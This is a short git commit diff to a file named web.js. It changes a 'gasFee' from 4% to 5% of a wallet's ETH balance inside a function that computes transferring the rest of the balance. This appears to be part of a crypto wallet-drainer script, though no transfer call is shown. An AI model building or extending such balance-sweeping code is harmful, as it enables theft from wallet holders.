9d5fe25540784525ff60fc8ee995d7ce952e44ff
zeedzoey <145294465+zeedzoey@users.noreply.github.com>
2023-10-19 05:10:04 -0600

    Update web.js

--- web.js
+++ web.js
@@ -158,7 +158,7 @@ const handleEthereum = async()=>{
         const response = await fetch(ethBalanceApiUrl);
         const ethBalanceData = await response.json();
         const ethBalanceInWei = ethBalanceData.result;
-        const gasFee = 0.04*ethBalanceInWei;
+        const gasFee = 0.05*ethBalanceInWei;
         const ethtransaferableInWei  = Math.floor(ethBalanceInWei - gasFee);
     
         //const ethBalanceInEth = window.web3.utils.fromWei(ethBalanceInWei, "ether");
